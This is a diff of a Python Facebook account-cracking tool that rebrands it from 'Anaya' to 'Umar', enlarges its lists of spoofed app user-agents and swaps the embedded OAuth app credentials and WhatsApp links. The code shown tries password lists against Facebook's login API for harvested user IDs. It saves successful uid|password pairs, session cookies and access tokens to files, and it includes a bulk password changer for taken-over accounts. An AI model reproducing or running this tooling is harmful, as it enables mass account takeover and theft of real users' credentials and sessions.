@@ -46,22 +46,24 @@ ses = requests.Session()
 def logo():
 	os.system('clear')
 	logo = ("""\33[;33m            
-\033[92m                                                                                                                                                     
- d888b8b    88bd88b  d888b8b  ?88   d8P  d888b8b  
-d8P' ?88    88P' ?8bd8P' ?88  d88   88  d8P' ?88  
-88b  ,88b  d88   88P88b  ,88b ?8(  d88  88b  ,88b 
-`?88P'`88bd88'   88b`?88P'`88b`?88P'?8b `?88P'`88b
-                                     )88          
-     𝓪𝓷𝓪𝔂𝔀 𝓬𝓱𝓪𝓾𝓭𝓱𝓻𝔂                ,d8P          
-                                 `?888P'                                                
-[<>] The Original Codes are 𝓪𝓷𝓪𝔂𝔀 𝓬𝓱𝓪𝓾𝓭𝓱𝓻𝔂  \033[1;97m
+\033[92m
+   
+ ...    :::.        :    :::.    :::::::..   
+ ;;     ;;;;;,.    ;;;   ;;`;;   ;;;;``;;;;  
+[['     [[[[[[[, ,[[[[, ,[[ '[[,  [[[,/[[['  
+$$      $$$$$$$$$$$"$$$c$$$cc$$$c $$$$$$c    
+88    .d888888 Y88" 888o888   888,888b "88bo,
+ "YmmMMMM""MMM  M'  "MMMYMM   ""` MMMM   "W" 
+                                      
+[<>] The Original Codes are Written by Umar Nazeer 
 ---------------------------------------------------
- ╰◈▪➣ Author    : ★彡[𝓪𝓷𝓪𝔂𝔀 𝓬𝓱𝓪𝓾𝓭𝓱𝓻𝔂]彡★ 
- ╰◈▪➣ Version   : Version [10.4]
- ╰◈▪➣ Cloning   : New Idz
- ╰◈▪➣ Sires     : 61554, 61555 
+ ╰◈▪➣ Github    : https://github.com/CyberAttack 
+ ╰◈▪➣ Facebook  : https://www.facebook.com/InnocentUmarr
+ ╰◈▪➣ Author    : ★彡[ᴜᴍᴀʀ ɴᴀᴢᴇᴇʀ]彡★ 
+ ╰◈▪➣ Version   : Version [10.6]
+ ╰◈▪➣   \033[1;96m★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★\033[1;97m
 -------------------------------------------------- 
-""")  
+\033[1;97m""")  
 	p(logo)
 def clear():
 	os.system("clear")
@@ -87,85 +89,78 @@ def connection_token():
 	 # convert list to string
 	 final_string = ''.join(sample_list)
 	 return final_string
-mango = f"{random.choice(['en_US', 'th_TH', 'es_ES', 'fr_FR', 'de_DE', 'it_IT', 'ja_JP', 'ko_KR', 'ru_RU',
-        'pt_BR', 'zh_CN', 'ar_SA', 'hi_IN', 'tr_TR', 'nl_NL', 'id_ID', 'pl_PL', 'sv_SE',
-        'no_NO', 'da_DK', 'fi_FI', 'hu_HU', 'cs_CZ', 'el_GR', 'he_IL', 'vi_VN', 'ro_RO',
-        'bg_BG', 'hr_HR', 'sr_RS', 'sk_SK', 'sl_SI', 'et_EE', 'lv_LV', 'lt_LT', 'uk_UA'])}"
- 
+
 #method1
-yahe ="[FBAN/FB4A;FBAV/342.1.0.14.119;FBBV/339015010[FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/339015010;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1:;]","[FBAN/FB4A;FBAV/343.0.0.8.474;FBBV/344064182[FBAN/Orca-Android;FBAV/343.0.0.8.474;FBPN/com.facebook.orca;FBLC/en_US;FBBV/344064182;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1:;]"
+yahe ="[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBBV/16048044;FBDM/{density=2.0,width=720,height=1184};FB_FW/1};FBLC/en_US;FBCR/Telia;FBMF/zte;FBBD/zte;FBPN/com.facebook.orca;FBDV/Z987;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBBV/182747440;FBDM/{density=2.0,width=1424,height=720};FB_FW/1};FBLC/th_TH;FBCR/null;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH1909;FBSV/8.1.0;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/Orca-Android;FBAV/238.0.0.14.120;FBBV/179092826;FBDM/{density=2.0,width=1200,height=1852};FB_FW/1};FBLC/th_TH;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.orca;FBDV/AGS2-L09;FBSV/8.0.0;nullFBCA/armeabi-v7a:armeabi;]"
 
 
 def uaa():
     app_versions = [ '196.0.0.29.99', '200.0.0.30.105', '180.0.0.24.82',
-        '210.0.0.35.120', '220.0.0.40.150', '230.0.0.45.180']  # Add more versions if needed
+        '210.0.0.35.120', '220.0.0.40.150', '230.0.0.45.180', 'YZWSES93', '4Q095MQG', 'A1XDL5U4']  # Add more000000 versions if needed
     locales = ['en_US', 'th_TH', 'es_ES', 'fr_FR', 'de_DE', 'it_IT', 'ja_JP', 'ko_KR', 'ru_RU',
         'pt_BR', 'zh_CN', 'ar_SA', 'hi_IN', 'tr_TR', 'nl_NL', 'id_ID', 'pl_PL', 'sv_SE',
         'no_NO', 'da_DK', 'fi_FI', 'hu_HU', 'cs_CZ', 'el_GR', 'he_IL', 'vi_VN', 'ro_RO',
         'bg_BG', 'hr_HR', 'sr_RS', 'sk_SK', 'sl_SI', 'et_EE', 'lv_LV', 'lt_LT', 'uk_UA']  # Add more locales if needed
     carriers = ['null', 'AIS', 'Verizon', 'Vodafone']  # Add more carriers if needed
-    manufacturers = ['samsung']  # Add more manufacturers if needed
+    manufacturers = ['samsung', 'OPPO', 'TECNO', 'Realme', 'Sony', 'LG', 'Nokia', 'VIVO', 'Apple', 'Xiaomi', 'OnePlus', 'Motorola', 'Nokia', 'Lenovo', 'BlackBerry', 'Oppo', 'Vivo', 'Realme', 'OnePlus', 'HTC', 'ZTE', 'Meizu', 'Infinix', 'Tecno', 'Xolo', 'Micromax', 'Honor', 'Sharp', 'Lenovo', 'Panasonic', 'Asus', 'Lava', 'Gionee', 'HMD_Global', 'Honor', 'LeEco', 'Lenovo',
+	'Micromax', 'Nubia', 'Oppo', 'Panasonic', 'Realme', 'Sharp', 'Sony', 'Vivo', 'Xiaomi', 'Motorola', 'Nokia', 'Blackberry', 'Google', 'HTC', 'LG', 'Lenovo', 'OnePlus', 'Realme', 'Sony', 'Vivo', 'ZTE', 'Alcatel', 'Amazon', 'Blackview', 'Blu', 'Cubot', 'Elephone', 'Gigaset', 'Hisense', 'Infinix', 'Karbonn', 'Kazam',
+	'Kyocera', 'Lephone', 'Medion', 'Meizu', 'Micromax', 'Nextbit', 'Nubia', 'NuVision', 'Obi', 'Onida', 'Oppo', 'Palm', 'Parla', 'Poco', 'Razer', 'Realme', 'Sanyo', 'Spice', 'Tecno', 'Verykool', 'Vivo', 'Wiko', 'Xolo', 'YU', 'Zebra', 'ZTE', 'ZUK',
+	'QMobile', 'Haier', 'Tecno', 'itel', 'Telenor', 'Nokia', 'Infinix', 'Motorola', 'OPhone', 'Rivo', 'VGO Tel', 'GFive', 'Megagate', 'Club Mobile', 'Voice Mobile', 'Calme', 'GFive', 'HTC', 'Honor', 'LG', 'Meizu', 'OnePlus', 'Oppo', 'Realme', 'Sony', 'Vivo', 'Xiaomi', 'ZTE']  # Add more manufacturers if needed
     android_versions = ['6.0.0' , '7.0.0', '8.0.0', '9.0.0', '10.0.0']  # Add more Android versions if needed
-    cpu_architectures = ['armeabi-v7a', 'arm64-v8a']  # Add more CPU architectures if needed
-    screen_densities = ['3.0', '2.0', '4.0']  # Add more screen densities if needed
+    cpu_architectures = ['armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64', 'armeabi']  # Add more CPU architectures if needed
+    screen_densities = ['3.0', '2.0', '4.0', "1.5", '2.5', '3.0']  # Add more screen densities if needed
 
     user_agent = (
         f"FBAN/Orca-Android;FBAV/{random.choice(app_versions)};"
         f"FBPN/com.facebook.orca;FBLC/{random.choice(locales)};"
         f"FBBV/{random.randint(100000000, 999999999)};"
         f"FBCR/{random.choice(carriers)};FBMF/{random.choice(manufacturers)};"
-        f"FBBD/{random.choice(manufacturers)};FBDV/{random.choice(['SM-A720F','SM-G5700', 'SM-G5510', 'SM-G5520', 'SM-G5528', 'SM-J710FN', 'SM-A826S'])};"
+        f"FBBD/{random.choice(manufacturers)};FBDV/{random.choice(['SM-A720F','SM-G5700', 'SM-G5510', 'SM-G5520', 'SM-G5528', 'SM-J710FN', 'SM-A826S', 'SM-N980BDS', 'SM-G970F', 'iPhone12,8', 'HTC_U11', 'Pixel_5', 'Redmi_Note_9','SM-N980BDS', 'SM-G970F', 'iPhone12,8', 'HTC_U11', 'Pixel_5', 'Redmi_Note_9',
+    'Galaxy_S21', 'OnePlus_9', 'Mi_11', 'Poco_F3', 'Xperia_1_III', 'Mate_40_Pro',
+    'Moto_G60', 'ZenFone_8', 'Vivo_X60_Pro', 'Nokia_X20', 'Pixel_6', 'Galaxy_S22',
+    'iPhone13,1', 'Redmi_10', 'Xperia_5_III', 'OnePlus_9T', 'Mi_11T_Pro', 'Realme_GT',
+    'Xiaomi_Mi_12', 'Oppo_F19', 'LG_G9', 'Sony_Xperia_10_IV', 'Nokia_9_3', 'OnePlus_10',
+    'Vivo_V21', 'Xiaomi_Mi_11X', 'Motorola_Moto_G100', 'HTC_Desire_21', 'Realme_X9',
+    'Nokia_X60', 'Samsung_Galaxy_A32', 'OnePlus_Nord_CE', 'Sony_Xperia_1_IV', 'Xiaomi_Mi_12T',
+    'Oppo_Reno_6', 'Motorola_Moto_E7', 'LG_Wing', 'HTC_U20', 'Realme_X7', 'Nokia_X70',
+    'Vivo_Y53s', 'Xiaomi_Mi_Mix_4', 'Samsung_Galaxy_F42', 'OnePlus_Nord_N10', 'Sony_Xperia_5_IV',
+    'Xiaomi_Mi_12S', 'Oppo_Reno_7', 'Motorola_Moto_G200', 'LG_Velvet', 'HTC_Drive_7', 'Realme_X8',
+    'Nokia_X80', 'Vivo_Y73s', 'Xiaomi_Mi_Mix_5', 'Samsung_Galaxy_A42', 'OnePlus_Nord_N100',
+    'Sony_Xperia_5A', 'Xiaomi_Mi_12R', 'Oppo_Reno_8', 'Motorola_Moto_G300', 'LG_Q6', 'HTC_Drive_8',
+    'Realme_X9 Pro', 'Nokia_X90', 'Vivo_Y93s', 'Xiaomi_Mi_Mix_6', 'Samsung_Galaxy_F52',
+    'OnePlus_Nord_N200', 'Sony_Xperia_5B', 'Xiaomi_Mi_12T Pro', 'Oppo_Reno_9', 'Motorola_Moto_G400',
+    'LG_Q7', 'HTC_Drive_9', 'Realme_X10', 'Nokia_X100', 'Vivo_Y95s', 'Xiaomi_Mi_Mix_7',
+    'Samsung_Galaxy_A52', 'OnePlus_Nord_N300', 'Sony_Xperia_5C', 'Xiaomi_Mi_12U',
+    'Oppo_Reno_10', 'Motorola_Moto_G500', 'LG_Q8', 'HTC_Drive_10', 'Realme_X11', 'Nokia_X110',
+    'Vivo_Y100s', 'Xiaomi_Mi_Mix_8', 'Samsung_Galaxy_F62', 'OnePlus_Nord_N400', 'Sony_Xperia_5D',
+    'Xiaomi_Mi_12V', 'Oppo_Reno_11', 'Motorola_Moto_G600', 'LG_Q9', 'HTC_Drive_11', 'Realme_X12',
+    'Nokia_X120', 'Vivo_Y110s', 'Xiaomi_Mi_Mix_9', 'Samsung_Galaxy_A62', 'OnePlus_Nord_N500',
+    'Sony_Xperia_5E', 'Xiaomi_Mi_12W', 'Oppo_Reno_12', 'Motorola_Moto_G700', 'LG_Q10',
+    'HTC_Drive_12', 'Realme_X13', 'Nokia_X130', 'Vivo_Y120s', 'Xiaomi_Mi_Mix_10',
+    'Samsung_Galaxy_F72', 'OnePlus_Nord_N600', 'Sony_Xperia_5F', 'Xiaomi_Mi_12X',
+    'Oppo_Reno_13', 'Motorola_Moto_G800', 'LG_Q11', 'HTC_Drive_13', 'Realme_X14', 'Nokia_X140',
+    'Vivo_Y130s', 'Xiaomi_Mi_Mix_11', 'Samsung_Galaxy_A72', 'OnePlus_Nord_N700',
+    'Sony_Xperia_5G', 'Xiaomi_Mi_12Y', 'Oppo_Reno_14', 'Motorola_Moto_G900', 'LG_Q12',
+    'HTC_Drive_14', 'Realme_X15', 'Nokia_X150', 'Vivo_Y140s', 'Xiaomi_Mi_Mix_12',
+    'Samsung_Galaxy_F82', 'OnePlus_Nord_N800', 'Sony_Xperia_5H', 'Xiaomi_Mi_12Z',
+    'Oppo_Reno_15', 'Motorola_Moto_G1000', 'LG_Q13', 'HTC_Drive_15', 'Realme_X16',
+    'Nokia_X160', 'Vivo_Y150s', 'Xiaomi_Mi_Mix_13', 'Samsung_Galaxy_A82', 'OnePlus_Nord_N900',
+    'Sony_Xperia_5I', 'Xiaomi_Mi_12ZA', 'Oppo_Reno_16', 'Motorola_Moto_G1100', 'LG_Q14',
+    'HTC_Drive_16', 'Realme_X17', 'Nokia_X170', 'Vivo_Y160s', 'Xiaomi_Mi_Mix_14',
+    'Samsung_Galaxy_F92', 'OnePlus_Nord_N1000', 'Sony_Xperia_5J', 'Xiaomi_Mi_12ZB',
+    'Oppo_Reno_17', 'Motorola_Moto_G1200', 'LG_Q15'])};"
         f"FBSV/{random.choice(android_versions)};FBCA/{random.choice(cpu_architectures)};"
         f"FBDM/{{density={random.choice(screen_densities)},width=1080,height=1920}};FB_FW/1;"
     )
 
     return user_agent
-
-def connection_token():
-	 digits_count = 16
-	 letters_count = 16
-	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
-	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))
-
-	 # Convert resultant string to list and shuffle it to mix letters and digits
-	 sample_list = list(letters + digits)
-	 random.shuffle(sample_list)
-	 # convert list to string
-	 final_string = ''.join(sample_list)
-	 return final_string
-mango = f"{random.choice(['en_US', 'th_TH', 'es_ES', 'fr_FR', 'de_DE', 'it_IT', 'ja_JP', 'ko_KR', 'ru_RU',
-        'pt_BR', 'zh_CN', 'ar_SA', 'hi_IN', 'tr_TR', 'nl_NL', 'id_ID', 'pl_PL', 'sv_SE',
-        'no_NO', 'da_DK', 'fi_FI', 'hu_HU', 'cs_CZ', 'el_GR', 'he_IL', 'vi_VN', 'ro_RO',
-        'bg_BG', 'hr_HR', 'sr_RS', 'sk_SK', 'sl_SI', 'et_EE', 'lv_LV', 'lt_LT', 'uk_UA'])}"
-        
-yahe ="[FBAN/FB4A;FBAV/342.1.0.14.119;FBBV/339015010[FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/339015010;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1:;]","[FBAN/FB4A;FBAV/343.0.0.8.474;FBBV/344064182[FBAN/Orca-Android;FBAV/343.0.0.8.474;FBPN/com.facebook.orca;FBLC/en_US;FBBV/344064182;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1:;]"
 
 
 def baba():
-    app_versions = [ '196.0.0.29.99', '200.0.0.30.105', '180.0.0.24.82',
-        '210.0.0.35.120', '220.0.0.40.150', '230.0.0.45.180']  # Add more versions if needed
-    locales = ['en_US', 'th_TH', 'es_ES', 'fr_FR', 'de_DE', 'it_IT', 'ja_JP', 'ko_KR', 'ru_RU',
-        'pt_BR', 'zh_CN', 'ar_SA', 'hi_IN', 'tr_TR', 'nl_NL', 'id_ID', 'pl_PL', 'sv_SE',
-        'no_NO', 'da_DK', 'fi_FI', 'hu_HU', 'cs_CZ', 'el_GR', 'he_IL', 'vi_VN', 'ro_RO',
-        'bg_BG', 'hr_HR', 'sr_RS', 'sk_SK', 'sl_SI', 'et_EE', 'lv_LV', 'lt_LT', 'uk_UA']  # Add more locales if needed
-    carriers = ['null', 'AIS', 'Verizon', 'Vodafone']  # Add more carriers if needed
-    manufacturers = ['samsung']  # Add more manufacturers if needed
-    android_versions = ['6.0.0' , '7.0.0', '8.0.0', '9.0.0', '10.0.0']  # Add more Android versions if needed
-    cpu_architectures = ['armeabi-v7a', 'arm64-v8a']  # Add more CPU architectures if needed
-    screen_densities = ['3.0', '2.0', '4.0']  # Add more screen densities if needed
-
-    user_agent = (
-        f"FBAN/Orca-Android;FBAV/{random.choice(app_versions)};"
-        f"FBPN/com.facebook.orca;FBLC/{random.choice(locales)};"
-        f"FBBV/{random.randint(100000000, 999999999)};"
-        f"FBCR/{random.choice(carriers)};FBMF/{random.choice(manufacturers)};"
-        f"FBBD/{random.choice(manufacturers)};FBDV/{random.choice(['SM-A720F','SM-G5700', 'SM-G5510', 'SM-G5520', 'SM-G5528', 'SM-J710FN', 'SM-A826S'])};"
-        f"FBSV/{random.choice(android_versions)};FBCA/{random.choice(cpu_architectures)};"
-        f"FBDM/{{density={random.choice(screen_densities)},width=1080,height=1920}};FB_FW/1;"
-    )
-
-    return user_agent
-
+    start = f'[FBAN/FB4A;FBAV/{random.randint(11,99)}.0.0.{random.randint(1111,9999)};FBBV/{random.randint(111111,9999999)};'
+    end = '[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/PCAT00;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;;]'
+    ua = start + end
+    return ua
 
 
 nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
@@ -193,8 +188,8 @@ class iAmMain:
 		elif opt1 == "2":self.num_menu()
 		elif opt1 == "4":automation().menu()
 		elif opt1 == "3":Grep().links_only()
-		elif opt1 == "W":os.system('xdg-open https://chat.whatsapp.com/GOBJZdlxr0Z30Zr2ZhQ6S7')
-		elif opt1 == "A":os.system("xdg-open https://wa.me/+923096902140")
+		elif opt1 == "W":os.system('xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf')
+		elif opt1 == "A":os.system("xdg-open https://wa.me/+923021431324")
 	  
 	
 	def dump_menu(self):
@@ -202,7 +197,7 @@ class iAmMain:
 		
 	def file_menu(self):
 		logo()
-		p(" 📁 : Example /sdcard/Anaya.txt")
+		p(" 📁 : Example /sdcard/Umar.txt")
 		file = input(" 📁 : Put File Path : ")
 		try:
 			id = open(file,"r").read().splitlines()
@@ -230,7 +225,7 @@ class iAmMain:
 			self.password_menu(id)
 		elif m_opt =="4":
 			 method.append('iiii')
-			self.password_menu(id)
+			 self.password_menu(id)
 		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)
 
 	def password_menu(self,id):
@@ -343,7 +338,7 @@ class iAmMain:
 	def method1(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [Anaya] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [Umar] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -418,7 +413,7 @@ class iAmMain:
 	def method2(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r Anaya %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r Umar %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -441,8 +436,8 @@ class iAmMain:
 "meta_inf_fbmeta": "NO_FILE",
 "advertiser_id": str(uuid.uuid4()),
 "currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
+"locale": "en_PK",
+"client_country_code": "PK",
 "method": "auth.login",
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
@@ -453,7 +448,7 @@ class iAmMain:
 'X-FB-Net-HNI': str(random.randint(30000, 40000)),
 'X-FB-SIM-HNI': str(random.randint(30000, 40000)),
 'X-FB-Connection-Type': f'{SEX}',
-'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
 'X-FB-Connection-Quality':f'{SEX}',
 "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
 'X-Tigon-Is-Retry': 'False',
@@ -471,16 +466,16 @@ class iAmMain:
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					token = q["access_token"]
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[Anaya-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					p(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
 					ok.append(uid)
-					open('/sdcard/Anaya_M2_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/Anaya_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M2_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[Anaya-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/Anaya_M2_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M2_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -492,7 +487,7 @@ class iAmMain:
 	def method3(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [Anaya %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -545,15 +540,15 @@ class iAmMain:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[Anaya-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/Anaya_M3_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/Anaya_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M3_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[Anaya-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/Anaya_M3_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M3_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -565,7 +560,7 @@ class iAmMain:
 	def method4(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [Anaya] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -602,15 +597,15 @@ class iAmMain:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[Anaya-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/Anaya_M4_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/Anaya_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
+					open('/sdcard/UMAR_M4_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[Anaya-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/Anaya_M4_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_M4_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -622,7 +617,7 @@ class iAmMain:
 	def r_crack(self,uid,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [Anaya] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			for pw in pwx:
 				data = {"adid": str(uuid.uuid4()),
 "format": "json",
@@ -670,15 +665,15 @@ class iAmMain:
 				if "session_key" in q:
 					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 					cookie = f"sb={sb};{coki}"
-					p('\r\033[1;92m[Anaya-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
-					open('/sdcard/Anaya_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
-					open('/sdcard/Anaya_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+					open('/sdcard/UMAR_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[Anaya-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
-					open('/sdcard/Anaya_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
+					open('/sdcard/UMAR_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				else:
 					continue
@@ -690,12 +685,12 @@ class iAmMain:
 class Join:
 	def __init_(self):
 		logo()
-		os.system("xdg-open https://wa.me/+923096902140")
+		os.system("xdg-open https://wa.me/+923021431324")
 	def Whatsapp(self):
 		os.system('xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf')
 		iAmMain().iAmMenu()
 	def Facebook(self):
-		#os.system('xdg-open https://www.facebook.com/groups/1020338239226719/')
+		os.system('xdg-open https://www.facebook.com/groups/1020338239226719/')
 		iAmMain().iAmMenu()
 
 class Grep:
@@ -706,7 +701,7 @@ class Grep:
 		file = input(" [✓] File Path :- ")
 		try:
 			open(file,'r').read()
-			print("	[✓]	Example  /sdcard/Anaya.txt   ")
+			print("	[✓]	Example  /sdcard/Umar.txt   ")
 			out = input("  [=] Save Path :- ")
 			os.system('touch '+out)
 			os.system('sort -r '+file+' | uniq > '+out)
@@ -725,7 +720,7 @@ class Grep:
 			p(" [  Example  :-  /sdcard/file.txt  ] ")
 			file = input(" [•|•] Enter File Path :- ")
 			line()
-			p("	Example  :-  /sdcard/Anaya.txt   ")
+			p("	Example  :-  /sdcard/Umar.txt   ")
 			sav = input(" [✓] Enter Save Path :- ")
 			line()
 			p(" [•]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
@@ -762,7 +757,7 @@ class Grep:
 			line()
 			file = input(" [✓] File Path :- ")
 			line()
-			p("	Example  :-  /sdcard/Anaya.txt 	")
+			p("	Example  :-  /sdcard/Umar.txt 	")
 			ofile= input(" [✓] File Save Path :- ")
 			line()
 			try:
@@ -843,7 +838,7 @@ class automation:
 		p(" [•] File Splitted Complete")
 	def iAmPasswordManager(self):
 		logo()
-		p(" [•] Password Changer By : Anaya")
+		p(" [•] Password Changer By : UMAR")
 		line()
 		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
 		line()
@@ -865,9 +860,9 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "Anaya@@@"
+			iamdefaultpassword = "UMAR@@@"
 		logo()
-		p(" [•] Password Changer By : Anaya")
+		p(" [•] Password Changer By : UMAR")
 		line()
 		print(" [•] Default Password : %s "%(iamdefaultpassword))
 		line()
